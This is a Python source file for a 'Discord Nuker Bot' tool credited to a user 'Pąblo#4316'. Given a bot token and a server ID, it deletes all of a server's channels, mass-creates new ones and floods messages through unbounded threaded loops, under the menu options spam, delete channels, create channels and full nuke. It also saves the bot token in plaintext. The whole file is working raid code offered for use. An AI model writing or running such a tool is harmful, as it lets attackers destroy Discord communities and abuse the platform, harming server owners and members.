import requests, os, random, json, sys, threading
from pystyle import Colors, Colorate, Write
from time import sleep

user = os.getlogin()
path = f'C:/Users/{user}/AppData/local/DiscordNuker'
filepath = f'C:/Users/{user}/AppData/local/DiscordNuker/config.json'
isExist = os.path.exists(path)

if isExist == False:
    print(path)
    os.makedirs(path)

def main():
    try: 
        with open(filepath) as config_file:
            configdata = json.load(config_file)
        bot_token = configdata['bot_token']
        guild_id = configdata['guild_id']
        os.system("title DISCORD NUKER BOT  :  V1.1  :  SETUP")
    except:
        print(Colorate.Horizontal(Colors.purple_to_red, '''
    ┌┐┌┬ ┬┬┌─┌─┐  ┌┐ ┌─┐┌┬┐
    ││││ │├┴┐├┤   ├┴┐│ │ │ 
    ┘└┘└─┘┴ ┴└─┘  └─┘└─┘ ┴ By Pąblo#4316

    Pąblo#4316 | github.com/palblo/DiscordNukeBot
    '''))
        bot_token = Write.Input(f"\nBOT TOKEN -> ", Colors.blue_to_purple, interval=0.00005)
        guild_id = Write.Input(f"\nGUILD ID -> ", Colors.blue_to_purple, interval=0.00005)
        jsondata = {
            "bot_token" : bot_token,
            "guild_id" : guild_id
            }
        savejson = json.dumps(jsondata)
        with open(filepath, 'w') as config_file:
            config_file.write(savejson)
    os.system('cls')
    print(Colorate.Horizontal(Colors.purple_to_red, '''
┌┐┌┬ ┬┬┌─┌─┐  ┌┐ ┌─┐┌┬┐
││││ │├┴┐├┤   ├┴┐│ │ │ 
┘└┘└─┘┴ ┴└─┘  └─┘└─┘ ┴ By Pąblo#4316

Pąblo#4316 | github.com/palblo/DiscordNukeBot
    '''))

    os.system("title DISCORD NUKER BOT  :  V1.1  :  HOME")
    user = os.getlogin( )
    print(Colorate.Vertical(Colors.red_to_white, f'''
┌───────────────────┐
│        V1.1       │
│───────────────────│
│0 = RESET CONFIG   │
│1 = SPAM           │
│2 = DELETE CHANNELS│
│3 = CREATE CHANNELS│
│4 = FULL NUKE      │
└───────────────────┘
    '''))

    action = Write.Input(f"action -> ", Colors.blue_to_purple, interval=0.00005)
    header = {
        'authorization': f'Bot {bot_token}',
    }

    def SpamRequest():
        channel_id = random.choice(channels_id)
        r = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", data=payload, headers=header)
    def DeleteChannel():
        r = requests.delete(f"https://discord.com/api/v9/channels/{channel_id}", headers=header)
    def CreateChannel():
        r = requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", json={"name": channelname, "permission_overwrites": [], "type": 0}, headers=header)

    if action == '0':
        os.system("title DISCORD NUKER BOT  :  V1.1  :  RESET CONFIG")
        bot_token = Write.Input(f"\nBOT TOKEN -> ", Colors.blue_to_purple, interval=0.00005)
        guild_id = Write.Input(f"\nGUILD ID -> ", Colors.blue_to_purple, interval=0.00005)
        jsondata = {
            "bot_token" : bot_token,
            "guild_id" : guild_id
        }
        savejson = json.dumps(jsondata)
        with open(filepath, 'w') as config_file:
            config_file.write(savejson)
        main()

    if action == '1':
        os.system("title DISCORD NUKER BOT  :  V1.1  :  SPAM")
        channel_ids = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=header)
        channels_id = [channel['id'] for channel in json.loads(channel_ids.text)]
        print(Colorate.Horizontal(Colors.purple_to_red, '\nyou have selected SPAM', 1))
        message = Write.Input(f"\nMESSAGE -> ", Colors.blue_to_purple, interval=0.00005)
        payload = {
            "content": message
        }
        print(Colorate.Horizontal(Colors.green_to_red, f'\n[INFO] Press ctrl+c to close', 1))
        try:
         while True:
             t = threading.Thread(target=SpamRequest).start()
        except KeyboardInterrupt:
             os.system("python main.py") 
             exit()           

    if action == '2':
        os.system("title DISCORD NUKER BOT  :  V1.1  :  DELETE CHANNELS")
        channel_ids = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=header)
        channel_id = [channel['id'] for channel in json.loads(channel_ids.text)]
        print(Colorate.Horizontal(Colors.purple_to_red, '\n[SELECT] You have selected DELETE CHANNELS', 1))
        sleep(1)
        print(Colorate.Horizontal(Colors.purple_to_red, '\n[LOG] Delenting channels...', 1))
        for channel_id in channel_id:
            threading.Thread(target=DeleteChannel).start()
        print(Colorate.Horizontal(Colors.green_to_red, f'\n[INFO] Done', 1))
        sleep(3)
        main()   

    if action == '3':
        os.system("title DISCORD NUKER BOT  :  V1.1  :  CREATE CHANNELS")
        print(Colorate.Horizontal(Colors.purple_to_red, '\n[SELECT] You have selected CREATE CHANNELS', 1))
        channelname = Write.Input(f"\nCHANNELS NAME -> ", Colors.blue_to_purple, interval=0.00005)
        channelsamount = int(Write.Input(f"HOW MANY CHANNELS? -> ", Colors.blue_to_purple, interval=0.00005))
        sleep(1)
        print(Colorate.Horizontal(Colors.purple_to_red, f'\n[LOG] Creating {channelsamount} channels...', 1))
        for i in range(channelsamount):
            threading.Thread(target=CreateChannel).start()
        print(Colorate.Horizontal(Colors.green_to_red, f'\n[INFO] Done', 1))
        sleep(3)
        main()   

    if action == '4':
        os.system("title DISCORD NUKER BOT  :  V1.1 :  FULL NUKE")
        print(Colorate.Horizontal(Colors.purple_to_red, '\n[SELECT] You have selected FULL NUKE'))
        channelsamount = int(Write.Input(f"\nHOW MANY CHANNELS? -> ", Colors.blue_to_purple, interval=0.00005))
        channelname = Write.Input(f"CHANNELS NAME -> ", Colors.blue_to_purple, interval=0.00005)
        message = Write.Input(f"MESSAGE -> ", Colors.blue_to_purple, interval=0.00005)
        channel_ids = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=header)
        channel_id = [channel['id'] for channel in json.loads(channel_ids.text)]
        print(Colorate.Horizontal(Colors.purple_to_red, f'\n[LOG] Delenting all channels...', 1))
        for channel_id in channel_id:
            threading.Thread(target=DeleteChannel).start()
        sleep(3)
        print(Colorate.Horizontal(Colors.purple_to_red, f'[LOG] Creating ' + str(channelsamount) + ' channels...', 1))
        for i in range(channelsamount):
            threading.Thread(target=CreateChannel).start()
        payload = {
            "content": message
        }
        channel_ids = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=header)
        channels_id = [channel['id'] for channel in json.loads(channel_ids.text)]
        print(Colorate.Horizontal(Colors.purple_to_red, f'[LOG] Spamming', 1))
        print(Colorate.Horizontal(Colors.green_to_red, f'\n[INFO] Press ctrl+c to close', 1))
        try:
          while True:
                threading.Thread(target=SpamRequest).start()
        except KeyboardInterrupt:
             os.system("python main.py") 
             exit()    

main()    
